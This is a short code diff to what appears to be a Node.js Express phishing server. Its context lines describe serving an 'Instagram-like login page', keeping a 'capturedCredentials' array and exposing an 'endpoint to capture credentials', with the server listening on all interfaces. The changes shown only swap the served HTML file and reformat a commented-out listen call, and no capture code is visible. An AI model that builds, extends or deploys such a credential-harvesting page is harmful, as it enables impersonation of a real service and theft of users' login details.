@@ -12,7 +12,7 @@ const capturedCredentials = [];
 
 // Serve the Instagram-like login page
 app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/index.html");
+  res.sendFile(__dirname + "/index_01.html");
 });
 
 // Endpoint to capture credentials
@@ -34,6 +34,6 @@ app.listen(PORT, "0.0.0.0", () => {
 
 
 // Start the server
-/*app.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
-});*/
+// app.listen(PORT, () => {
+//   console.log(`Server is running on http://localhost:${PORT}`);
+// });
